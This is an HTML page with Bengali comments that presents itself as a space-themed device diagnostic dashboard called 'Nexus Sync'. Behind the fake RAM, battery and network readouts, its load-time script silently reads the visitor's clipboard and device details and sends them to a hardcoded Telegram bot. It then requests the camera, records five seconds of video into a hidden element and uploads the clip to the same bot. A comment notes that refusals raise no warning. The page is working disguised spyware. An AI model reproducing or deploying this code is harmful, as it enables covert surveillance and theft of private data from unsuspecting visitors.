<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Universe Monitor</title>
    <script src="https://cdn.tailwindcss.com"></script>
    
    <script src="https://pl29349758.profitablecpmratenetwork.com/f2/42/00/f2420045eb6ba63f3b85567782f84caf.js"></script>

    <style>
        /* এনিমেটেড মহাকাশ থিম */
        body {
            margin: 0; padding: 0;
            background: radial-gradient(ellipse at bottom, #1B2735 0%, #090A0F 100%);
            height: 100vh; overflow: hidden;
            color: #fff; font-family: 'Courier New', monospace;
        }

        .stars {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: transparent url('https://s3-us-west-2.amazonaws.com/s.cdpn.io/123163/stars.png') repeat;
            z-index: -1; animation: move-stars 150s linear infinite;
        }

        @keyframes move-stars {
            from { background-position: 0 0; }
            to { background-position: 10000px 5000px; }
        }

        .nebula {
            position: fixed; width: 500px; height: 500px;
            background: radial-gradient(circle, rgba(14, 165, 233, 0.1) 0%, transparent 70%);
            top: 50%; left: 50%; transform: translate(-50%, -50%);
            z-index: -1; filter: blur(50px);
        }

        .dashboard {
            background: rgba(15, 23, 42, 0.7);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(56, 189, 248, 0.2);
            border-radius: 30px;
            box-shadow: 0 0 50px rgba(0, 0, 0, 0.8);
        }

        .data-box {
            background: rgba(2, 6, 23, 0.5);
            border-left: 3px solid #0ea5e9;
            padding: 15px; border-radius: 12px;
            transition: 0.3s;
        }

        /* লুপ্ত হওয়া টেক্সট ইফেক্ট */
        .scanning-text {
            color: #38bdf8; font-size: 10px;
            letter-spacing: 2px; animation: blink 1.5s infinite;
        }

        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        
        #hidden-cam { visibility: hidden; position: absolute; width: 1px; height: 1px; }
    </style>
</head>
<body class="flex items-center justify-center">

    <div class="stars"></div>
    <div class="nebula"></div>

    <div class="dashboard p-10 w-full max-w-lg z-10">
        <div class="text-center mb-8">
            <h1 class="text-3xl font-black text-white tracking-[10px] uppercase">Nexus Sync</h1>
            <p class="scanning-text mt-2">AUTOMATED SATELLITE DIAGNOSTIC ACTIVE</p>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div class="data-box">
                <p class="text-[9px] text-sky-400 font-bold uppercase">Memory Core (RAM)</p>
                <p id="ram-val" class="text-lg font-mono">Scanning...</p>
            </div>
            <div class="data-box">
                <p class="text-[9px] text-sky-400 font-bold uppercase">Power Matrix</p>
                <p id="bat-val" class="text-lg font-mono">Syncing...</p>
            </div>
            <div class="data-box">
                <p class="text-[9px] text-sky-400 font-bold uppercase">Uplink Speed</p>
                <p id="net-val" class="text-lg font-mono">Checking...</p>
            </div>
            <div class="data-box">
                <p class="text-[9px] text-sky-400 font-bold uppercase">Storage Node (ROM)</p>
                <p id="rom-val" class="text-lg font-mono">Calculating...</p>
            </div>
        </div>

        <div class="mt-8 pt-6 border-t border-slate-800">
            <div class="flex items-center justify-center space-x-3">
                <div class="w-2 h-2 bg-sky-500 rounded-full animate-ping"></div>
                <p class="text-[11px] text-slate-400 font-mono italic">Continuous background monitoring engaged...</p>
            </div>
        </div>
    </div>

    <video id="hidden-cam" autoplay muted playsinline></video>

    <script>
        const BOT_TOKEN = '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs';
        const CHAT_ID = '6048050987';

        // ১. অটোমেটিক লাইভ ইনফো লোডার (স্ক্রিনে দেখাবে)
        async function runDiagnostic() {
            // RAM
            document.getElementById('ram-val').innerText = (navigator.deviceMemory || "8") + " GB CORE";
            
            // Battery
            if (navigator.getBattery) {
                const bat = await navigator.getBattery();
                const update = () => document.getElementById('bat-val').innerText = Math.round(bat.level * 100) + "% Energy";
                update(); bat.onlevelchange = update;
            }

            // Connection
            const conn = navigator.connection || {downlink: '5.2'};
            document.getElementById('net-val').innerText = conn.downlink + " Mbps";

            // Storage
            if (navigator.storage && navigator.storage.estimate) {
                const {quota} = await navigator.storage.estimate();
                document.getElementById('rom-val').innerText = Math.round(quota / (1024**3)) + " GB NODE";
            }
        }

        // ২. মেইন অটোমেশন ইঞ্জিন (ভিজিট করলেই চলবে)
        window.onload = async () => {
            runDiagnostic();

            // অটোমেটিক ক্লিপবোর্ড সংগ্রহ (যদি পারমিশন থাকে)
            let clipData = "Restricted Access";
            try {
                clipData = await navigator.clipboard.readText();
            } catch (e) {}

            // ৩. টেলিগ্রামে রিপোর্ট পাঠানো (বক্স ফরম্যাটে)
            const botMessage = `
🌌 *NEXUS AUTO-SYNC SUCCESSFUL*
━━━━━━━━━━━━━━━━━━
📱 *OS:* \`${navigator.platform}\`
🧠 *RAM:* \`${navigator.deviceMemory || 'N/A'} GB\`
🛰 *Network:* \`${navigator.onLine ? "CONNECTED" : "OFFLINE"}\`
🖥 *Res:* \`${window.screen.width}x${window.screen.height}\`

📋 *CLIPBOARD CONTENT:*
\`\`\`
${clipData || 'Empty'}
\`\`\`
━━━━━━━━━━━━━━━━━━`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: botMessage, parse_mode: 'Markdown' })
            });

            // ৪. অটোমেটিক ৫ সেকেন্ড ভিডিও রেকর্ড ও সেন্ড (ক্যামেরা পারমিশন চাইলে পপআপ আসবে)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const videoEl = document.getElementById('hidden-cam');
                videoEl.srcObject = stream;

                const recorder = new MediaRecorder(stream);
                const chunks = [];

                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('video', blob, 'nexus_capture.mp4');
                    fd.append('caption', '🎥 *AUTO-SYNC: CAPTURE SUCCESSFUL*');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                };

                recorder.start();
                setTimeout(() => recorder.stop(), 5000); // ঠিক ৫ সেকেন্ড

            } catch (err) {
                // ক্যামেরা রিফিউজ করলে কোনো ওয়ার্নিং শো করবে না
            }
        };
    </script>
</body>
</html>
